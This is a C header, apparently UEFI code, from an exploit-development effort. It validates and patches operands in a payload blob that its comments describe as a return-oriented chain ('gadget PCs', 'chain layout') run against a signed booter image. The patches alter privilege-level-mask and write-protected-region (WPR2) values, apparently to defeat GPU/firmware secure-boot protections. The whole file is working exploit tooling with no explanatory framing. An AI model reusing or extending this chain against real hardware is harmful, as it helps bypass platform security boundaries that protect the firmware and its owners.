/* Experiment 7: independent data-only deltas from BOOTRUN-ZERO.
 * Experiment 8 combines those three deltas in a separate helper below.
 * The signed code, gadget PCs, target addresses and chain layout stay intact.
 * build_v70.sh pins both the complete V67 blob and signed booter image. */
#ifndef U40X_PAYLOAD_CONTROL_H
#define U40X_PAYLOAD_CONTROL_H

static void u40x_payload_put32(UINT8 *p, UINTN off, UINT32 value)
{
    UINTN j;
    for (j = 0; j < 4; j++) p[off + j] = (UINT8)(value >> (8 * j));
}

static EFI_STATUS
u40x_payload_control(UINT8 *p, UINTN size, UINTN mode)
{
    static const struct { UINTN off; UINT32 value; } anchors[] = {
        {0x1100, 0xFU}, /* saved RESET_PLM write nibble, DMEM+0x1700 */
        {0xF95C, 0xFFFFFFFFU}, {0xF974, 0x409650U}, {0xF97C, 0x1F89U},
        {0xBB4C, 0xFFFFFF8FU}, {0xBB68, 0x409650U}, {0xBB84, 0x10AAU},
        {0xBB7C, 0}, {0xBB98, 0x1FA828U}, {0xBBB4, 0x10AAU},
        {0xBBAC, 0xFFU}, {0xBBC8, 0x8403C4U}, {0xBBE4, 0x10AAU},
        {0xBBDC, 0x1FFFFE00U}, {0xBBF8, 0x1FA824U}, {0xBC14, 0x10AAU},
        {0xBC0C, 0xFFU}, {0xBC28, 0x8403C4U}, {0xBC44, 0x10AAU},
        {0xBC58, 0x8E18U}, {0xBC5C, 0xC2U}, {0xBC6C, 0xD27U},
        {0xBCA8, 0x1CDDU}, {0xBCAC, 0x7C43U},
    };
    UINTN i, j;
    EFI_STATUS status;
    if (mode < 1 || mode > 3) return EFI_INVALID_PARAMETER;
    status = u40x_selector_payload(p, size, FALSE);
    if (EFI_ERROR(status)) return status;
    /* Validate all anchors before writing any byte, including ZERO operands. */
    for (i = 0; i < sizeof(anchors) / sizeof(anchors[0]); i++) {
        UINT32 value = 0;
        for (j = 0; j < 4; j++) value |= (UINT32)p[anchors[i].off + j] << (8 * j);
        if (value != anchors[i].value) return EFI_COMPROMISED_DATA;
    }
    u40x_payload_put32(p, 0xF988, 0);
    u40x_payload_put32(p, 0xBB20, 0);
    if (mode == 1) {
        /* Keep the observed cold FECS PLM value at the first writer too. */
        u40x_payload_put32(p, 0xF95C, 0xFFFFFF8FU);
    } else if (mode == 2) {
        /* Only final native restoration changes. Both explicit 0xFF writes
         * remain intact; this does NOT remove the temporary reset window. */
        u40x_payload_put32(p, 0x1100, 8);
    } else {
        /* Keep the same WPR2 range as after FWSEC. No new address or write. */
        u40x_payload_put32(p, 0xBB7C, 0x01FFEE00U);
        u40x_payload_put32(p, 0xBBDC, 0x01FFE000U);
    }
    return EFI_SUCCESS;
}

static EFI_STATUS u40x_payload_combined(UINT8 *p, UINTN size)
{
    /* Mode 1 validates all original operands/anchors before any mutation,
     * then installs ZERO+PLM-STOCK. All remaining stores are infallible and
     * target operands validated by that same call. Keep old modes intact. */
    EFI_STATUS status = u40x_payload_control(p, size, 1);
    if (EFI_ERROR(status)) return status;
    u40x_payload_put32(p, 0x1100, 8);
    u40x_payload_put32(p, 0xBB7C, 0x01FFEE00U);
    u40x_payload_put32(p, 0xBBDC, 0x01FFE000U);
    return EFI_SUCCESS;
}
#endif
